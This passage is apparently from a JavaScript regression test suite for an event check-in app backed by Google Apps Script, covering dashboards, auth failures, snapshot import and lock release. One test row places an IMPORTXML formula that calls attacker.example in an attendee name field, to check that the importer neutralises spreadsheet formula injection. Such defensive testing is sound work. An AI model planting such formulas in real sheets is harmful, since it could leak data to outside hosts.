  result = gas.actionUpdateBoothPresentation({
    boothId: "art",
    stepIndex: 3,
    status: "wrap",
    message: "Finish your last detail.",
    version: 1,
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.version, 2);
  assert.equal(result.createdAt, gasPresentationCreatedAt);
  assert.equal(result.status, "wrap");
  result = gas.actionBoothPresentation({ boothId: "heaven" });
  assert.equal(result.version, 0);
  assert.equal(result.status, "waiting");

  const beforeUnauthorizedBooth = lockState.acquisitions;
  assert.throws(
    () => gas.actionBoothDashboardData({ boothId: "newsong", organizerKey: "wrong" }),
    (error) => error.code === "AUTH_REQUIRED"
  );
  assert.equal(lockState.acquisitions, beforeUnauthorizedBooth);
  assert.throws(
    () => gas.actionBoothDashboardData({ boothId: "unknown", organizerKey: "gas-organizer-key" }),
    (error) => error.code === "BOOTH_NOT_FOUND"
  );
  assert.equal(lockState.acquisitions, beforeUnauthorizedBooth);
  result = gas.actionBoothDashboardData({ boothId: "newsong", organizerKey: "gas-organizer-key" });
  assert.equal(result.totalCheckins, 1);
  assert.deepEqual(Array.from(result.recentCheckins, (checkin) => checkin.name), ["Casey"]);
  assert.deepEqual(Array.from(result.songVotes, (entry) => ({ ...entry })), [{ title: "Victory", votes: 1 }]);
  assert.equal("phone" in result.recentCheckins[0], false);
  assert.equal("signups" in result, false);
  assert.equal(result.presentation.boothId, "newsong");
  assert.equal(result.presentation.version, 0);
  assertIsoTimestamp(result.serverNow, "Apps Script booth dashboard serverNow");
  result = gas.actionBoothDashboardData({ boothId: "art", organizerKey: "gas-organizer-key" });
  assert.equal(result.presentation.stepIndex, 3);
  assert.equal(result.presentation.status, "wrap");
  assert.equal(result.presentation.version, 2);

  assert.throws(
    () => gas.actionDashboardData({ organizerKey: "wrong" }),
    (error) => error.code === "AUTH_REQUIRED"
  );
  const gasDashboard = gas.actionDashboardData({ organizerKey: "gas-organizer-key" });
  assert.equal(gasDashboard.totals.registered, 2);
  assert.equal(gasDashboard.signups[0].optionId, "formula-test");
  assert.equal("songVotes" in gasDashboard, false);
  assert.equal("triviaLeaderboard" in gasDashboard, false);
  assertIsoTimestamp(gasDashboard.eventState.serverNow, "Apps Script dashboard serverNow");
  assert.equal(gasDashboard.wristbandGroups.length, 5);
  const gasBlueGroup = gasDashboard.wristbandGroups.find((group) => group.colorId === "blue");
  assert.equal(gasBlueGroup.count, 1);
  assert.equal(gasBlueGroup.attendees.length, 1);
  assert.equal(gasBlueGroup.attendees[0].name, "Avery");
  assert.equal(gasBlueGroup.attendees[0].raffleNumber, "1001");
  assert.equal(gasBlueGroup.attendees[0].completedStops, 0);
  assert.equal(gasBlueGroup.attendees[0].totalStops, 2);
  assert.equal(gasBlueGroup.attendees[0].phase3Completed, true);
  assert.equal("attendeeId" in gasBlueGroup.attendees[0], false);
  assert.equal("phone" in gasBlueGroup.attendees[0], false);
  assert.throws(
    () => gas.nextRaffleNumber(null),
    (error) => error.code === "LOCK_REQUIRED"
  );
  assert.throws(
    () => gas.actionFindOrRegisterByPhone({ attendeeId: "missing-public-id", phone: "6155550999" }),
    (error) => error.code === "ATTENDEE_NOT_FOUND"
  );
  assert.throws(
    () => gas.actionMyCheckins({ attendeeId: "missing-public-id" }),
    (error) => error.code === "ATTENDEE_NOT_FOUND"
  );
  assert.throws(
    () => gas.actionMySignupSelections({ attendeeId: "missing-public-id" }),
    (error) => error.code === "ATTENDEE_NOT_FOUND"
  );

  function post(action, payload) {
    const output = gas.doPost({ pathInfo: action, postData: { contents: JSON.stringify(payload || {}) } });
    assert.equal(output.mimeType, "json");
    return JSON.parse(output.content);
  }

  function nodeExportPayload() {
    return {
      exportKey: "gas-export-key",
      snapshot: {
        generatedAt: "2026-07-18T20:15:00.000Z",
        dataResetAt: "initial",
        tabs: Object.fromEntries(Object.entries(EXPECTED_SHEETS_TAB_HEADERS).map(([name, headers]) => [
          name,
          { headers: headers.slice(), rows: [] },
        ])),
      },
    };
  }

  function clonePayload(payload) {
    return JSON.parse(JSON.stringify(payload));
  }

  const liveSheetNames = Object.keys(EXPECTED_SHEETS_TAB_HEADERS).map((name) => `Live_${name}`);
  const liveSheetsAbsent = () => liveSheetNames.every((name) => spreadsheet.getSheetByName(name) === null);

  // The Node export has a distinct server-only credential. Supplying even the
  // valid organizer key must fail before acquiring the global Script lock.
  const beforeBadExportAuth = lockState.acquisitions;
  assert.throws(
    () => gas.actionImportNodeSnapshot(Object.assign(nodeExportPayload(), {
      exportKey: "gas-organizer-key",
    })),
    (error) => error.code === "EXPORT_AUTH_REQUIRED"
  );
  assert.equal(lockState.acquisitions, beforeBadExportAuth);
  assert.equal(liveSheetsAbsent(), true);

  // Every logical tab and header is allowlisted. Validation covers the whole
  // payload before the first Live_* sheet is created or changed.
  const wrongHeaders = nodeExportPayload();
  wrongHeaders.snapshot.tabs.Attendees.headers[0] = "unexpectedId";
  assert.throws(
    () => gas.actionImportNodeSnapshot(wrongHeaders),
    (error) => error.code === "INVALID_EXPORT_SNAPSHOT"
  );
  assert.equal(liveSheetsAbsent(), true);
  const unexpectedTab = nodeExportPayload();
  unexpectedTab.snapshot.tabs.Unexpected = { headers: [], rows: [] };
  assert.throws(
    () => gas.actionImportNodeSnapshot(unexpectedTab),
    (error) => error.code === "INVALID_EXPORT_SNAPSHOT"
  );
  assert.equal(liveSheetsAbsent(), true);
  const wrongRowWidth = nodeExportPayload();
  wrongRowWidth.snapshot.tabs.Attendees.rows = [["too-short"]];
  assert.throws(
    () => gas.actionImportNodeSnapshot(wrongRowWidth),
    (error) => error.code === "INVALID_EXPORT_SNAPSHOT"
  );
  assert.equal(liveSheetsAbsent(), true);

  const legacyRowsBeforeExport = {
    Attendees: JSON.stringify(spreadsheet.getSheetByName("Attendees").rows),
    SignUps: JSON.stringify(spreadsheet.getSheetByName("SignUps").rows),
    SongVotes: JSON.stringify(spreadsheet.getSheetByName("SongVotes").rows),
  };
  const firstSnapshot = nodeExportPayload();
  firstSnapshot.snapshot.tabs.Attendees.rows = [
    [
      "node-a", "[]", "=IMPORTXML(\"https://attacker.example\")", "6155550303", "2001",
      "blue", "2026-07-18T20:00:00.000Z", "2026-07-18T20:01:00.000Z", "",
      "[\"heaven\"]", 1, "[\"future\"]",
    ],
    [
      "node-b", "[]", "Second Attendee", "6155550404", "2002", "red",
      "2026-07-18T20:02:00.000Z", "2026-07-18T20:03:00.000Z", "", "[]", 0, "[]",
    ],
  ];
  firstSnapshot.snapshot.tabs.SignUps.rows = [[
    "signup-a", "node-a", "First Attendee", "6155550303", "2001", "blue", "future",
    "Keep me posted on future events", "2026-07-18T20:10:00.000Z", false, "", "",
  ]];
  firstSnapshot.snapshot.tabs.ExportMeta.rows = [
    ["schemaVersion", 1],
    ["generatedAt", firstSnapshot.snapshot.generatedAt],
    ["dataResetAt", firstSnapshot.snapshot.dataResetAt],
  ];
  result = gas.actionImportNodeSnapshot(firstSnapshot);
  assert.equal(result.ok, true);
  assert.equal(result.rowCounts.Attendees, 2);
  assert.equal(result.rowCounts.SignUps, 1);
  assertIsoTimestamp(result.importedAt, "Apps Script Node export importedAt");
  liveSheetNames.forEach((name) => assert.ok(spreadsheet.getSheetByName(name), name));
  assert.equal(spreadsheet.getSheetByName("BoothResults"), null);
  assert.equal(JSON.stringify(spreadsheet.getSheetByName("Attendees").rows), legacyRowsBeforeExport.Attendees);
  assert.equal(JSON.stringify(spreadsheet.getSheetByName("SignUps").rows), legacyRowsBeforeExport.SignUps);
  assert.equal(JSON.stringify(spreadsheet.getSheetByName("SongVotes").rows), legacyRowsBeforeExport.SongVotes);

  const liveAttendees = spreadsheet.getSheetByName("Live_Attendees");
  const attendeeHeaders = EXPECTED_SHEETS_TAB_HEADERS.Attendees;
  assert.deepEqual(liveAttendees.rows[0], attendeeHeaders);
  assert.equal(
    liveAttendees.rows[1][attendeeHeaders.indexOf("name")],
    "'=IMPORTXML(\"https://attacker.example\")"
  );

  // A smaller full snapshot overwrites the current matrix, removes old data
  // rows, and clears columns left behind by an older schema. Exercise this
  // through doPost as well so the bound Web App path remains wired.
  const obsoleteColumn = attendeeHeaders.length;
  liveAttendees.ensureCell(1, obsoleteColumn + 1);
  liveAttendees.ensureCell(2, obsoleteColumn + 1);
  liveAttendees.rows[0][obsoleteColumn] = "obsoleteColumn";
  liveAttendees.rows[1][obsoleteColumn] = "stale value";
  const smallerSnapshot = nodeExportPayload();
  smallerSnapshot.snapshot.generatedAt = "2026-07-18T20:16:00.000Z";
  smallerSnapshot.snapshot.tabs.Attendees.rows = [[
    "node-a", "[]", "Current Attendee", "6155550303", "2001", "blue",
    "2026-07-18T20:00:00.000Z", "2026-07-18T20:01:00.000Z", "", "[]", 0, "[]",
  ]];
  smallerSnapshot.snapshot.tabs.ExportMeta.rows = [
    ["schemaVersion", 1],
    ["generatedAt", smallerSnapshot.snapshot.generatedAt],
    ["dataResetAt", smallerSnapshot.snapshot.dataResetAt],
  ];
  const postedImport = post("importNodeSnapshot", smallerSnapshot);
  assert.equal(postedImport.ok, true);
  assert.equal(postedImport.rowCounts.Attendees, 1);
  assert.equal(postedImport.rowCounts.SignUps, 0);
  assert.equal(liveAttendees.getLastRow(), 2);
  assert.equal(liveAttendees.rows[0][obsoleteColumn], "");
  assert.equal(liveAttendees.rows[1][obsoleteColumn], "");
  assert.equal(liveAttendees.rows[2].every((value) => value === ""), true);
  assert.equal(spreadsheet.getSheetByName("Live_SignUps").getLastRow(), 1);

  // Data tabs are written in a fixed order and ExportMeta is the final commit
  // marker. A transient failure on a later tab may expose a temporary mixed
  // generation, but the marker must remain on the prior complete snapshot;
  // the next full retry reconciles every tab and advances it.
  const liveTriviaAnswers = spreadsheet.getSheetByName("Live_TriviaAnswers");
  const liveExportMeta = spreadsheet.getSheetByName("Live_ExportMeta");
  const liveMetaValue = (key) => {
    const row = liveExportMeta.rows.find((candidate) => candidate[0] === key);
    return row ? row[1] : undefined;
  };
  assert.equal(liveMetaValue("generatedAt"), "2026-07-18T20:16:00.000Z");
  const interruptedSnapshot = clonePayload(smallerSnapshot);
  interruptedSnapshot.snapshot.generatedAt = "2026-07-18T20:17:00.000Z";
  interruptedSnapshot.snapshot.tabs.Attendees.rows[0][0] = "new-generation-attendee";
  interruptedSnapshot.snapshot.tabs.TriviaAnswers.rows = [[
    "answer-new", "new-generation-attendee", "Current Attendee", "2001", "blue",
    1, "trivia-session-1-run-1", 1, "question-1", 1, 0, true,
    "2026-07-18T20:16:30.000Z",
  ]];
  interruptedSnapshot.snapshot.tabs.ExportMeta.rows = [
    ["schemaVersion", 1],
    ["generatedAt", interruptedSnapshot.snapshot.generatedAt],
    ["dataResetAt", interruptedSnapshot.snapshot.dataResetAt],
  ];
  liveTriviaAnswers.failNextSetValues = true;
  assert.throws(
    () => gas.actionImportNodeSnapshot(interruptedSnapshot),
    /mock setValues failed/
  );
  assert.equal(liveAttendees.rows[1][0], "new-generation-attendee");
  assert.equal(liveTriviaAnswers.getLastRow(), 1);
  assert.equal(liveMetaValue("generatedAt"), "2026-07-18T20:16:00.000Z");
  result = gas.actionImportNodeSnapshot(interruptedSnapshot);
  assert.equal(result.ok, true);
  assert.equal(liveTriviaAnswers.getLastRow(), 2);
  assert.equal(liveMetaValue("generatedAt"), "2026-07-18T20:17:00.000Z");

  // The importer writes first and cleans up second. If the new setValues call
  // fails, the last complete snapshot must remain visible and the lock must
  // still be released for the exporter's retry.
  const previousLiveAttendees = JSON.stringify(liveAttendees.rows);
  const failedSnapshot = clonePayload(smallerSnapshot);
  failedSnapshot.snapshot.generatedAt = "2026-07-18T20:18:00.000Z";
  failedSnapshot.snapshot.tabs.Attendees.rows[0][0] = "must-not-replace-current";
  liveAttendees.failNextSetValues = true;
  const beforeFailedWrite = lockState.acquisitions;
  assert.throws(
    () => gas.actionImportNodeSnapshot(failedSnapshot),
    /mock setValues failed/
  );
  assert.equal(lockState.acquisitions, beforeFailedWrite + 1);
  assert.equal(lockState.releases, lockState.acquisitions);
  assert.equal(lockState.held, false);
  assert.equal(JSON.stringify(liveAttendees.rows), previousLiveAttendees);

  const gasHttpRegistration = post("registerAttendee", {
    attendeeId: "gas-http-entry", name: "HTTP", phone: "6155550404",
  });
  assert.equal(gasHttpRegistration.raffleNumber, "1004");
  assert.equal(gasHttpRegistration.phoneLinked, true);
  assert.equal(post("loginAttendee", { name: "HTTP", phone: "6155550404", portal: "phase3" }).attendeeId, "gas-http-entry");
  assert.equal(post("saveSongVote", { attendeeId: "gas-http-entry", songTitle: "Elohim" }).songTitle, "Elohim");
  assert.equal(post("mySignupSelections", { attendeeId: "gas-http-entry" }).completedAt, null);
  const httpPhase3Finish = post("saveSignupSelections", { attendeeId: "gas-http-entry", optionIds: [] });
  assertIsoTimestamp(httpPhase3Finish.completedAt, "Apps Script HTTP Phase 3 completedAt");
  assert.equal(
    post("mySignupSelections", { attendeeId: "gas-http-entry" }).completedAt,
    httpPhase3Finish.completedAt
  );
  assert.equal(
    post("attendeePortalSession", { attendeeId: "gas-http-entry", portal: "phase3" }).phase3CompletedAt,
    httpPhase3Finish.completedAt
  );
  assert.equal(post("dashboardData", { organizerKey: "wrong" }).code, "AUTH_REQUIRED");
  assert.equal(post("myCheckins", {}).code, "ATTENDEE_ID_REQUIRED");
  assert.equal(post("mySignupSelections", {}).code, "ATTENDEE_ID_REQUIRED");
  assert.equal(post("doesNotExist", {}).code, "UNKNOWN_ACTION");

  assert.throws(
    () => gas.withScriptLock(() => { throw new Error("callback failed"); }),
    /callback failed/
  );
  assert.equal(lockState.held, false);
  flushShouldThrow = true;
  assert.throws(() => gas.withScriptLock(() => "ok"), /flush failed/);
  assert.equal(lockState.held, false);
  flushShouldThrow = false;
  assert.equal(lockState.acquisitions, lockState.releases);
}

async function main() {
  try {
    runInlineScriptSyntaxRegression();
    await runGoogleSheetsExporterRegression();
    const legacyDatabase = {
      attendees: [{
        attendeeId: "legacy-migration-attendee",
        aliasIds: [],
        name: "Legacy Guest",
        phone: "6155550999",
        phoneVerifiedAt: "2026-07-18T19:00:00.000Z",
        phoneVerificationRequired: false,
        raffleNumber: "1001",
        registeredAt: "2026-07-18T19:00:00.000Z",
      }],
      otpChallenges: [{ challengeId: "retired-challenge", codeDigest: "retired-digest" }],
      raffleCounter: 1001,
      dataResetAt: "initial",
    };
    fs.writeFileSync(testDb, JSON.stringify(legacyDatabase, null, 2));
    fs.writeFileSync(`${testDb}.bak`, JSON.stringify(legacyDatabase, null, 2));
    startServer(0);
    await once(server, "listening");
    const port = server.address().port;
    [testDb, `${testDb}.bak`].forEach((filename) => {
      const migrated = JSON.parse(fs.readFileSync(filename, "utf8"));
      assert.equal("otpChallenges" in migrated, false);
      assert.equal(migrated.attendees.length, 1);
      assert.equal(migrated.attendees[0].phone, "6155550999");
      assert.equal("phoneVerifiedAt" in migrated.attendees[0], false);
      assert.equal("phoneVerificationRequired" in migrated.attendees[0], false);
    });
    const migrationReset = await request(port, "resetDemo", {
      organizerKey: "test-organizer-key",
    });
    assert.equal(migrationReset.status, 200);
    assertIsoTimestamp(migrationReset.body.dataResetAt, "post-migration reset marker");
    await runGoogleSheetsExportApiRegression(port);
    await runApiRegression(port);
    await runTriviaApiRegression(port);
    await runHeavenApiRegression(port);
    await runArtApiRegression(port);
    await runNewSongApiRegression(port);
    await runCapacityRegression(port);
    await runFrontendContractRegression();
    runBoothDraftPersistenceRegression();
    runAppsScriptRegression();
    console.log("All event app regression tests passed.");
  } finally {
    if (server.listening) {
      server.close();
      await once(server, "close");
    }
    fs.rmSync(testDb, { force: true });
    fs.rmSync(`${testDb}.bak`, { force: true });
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
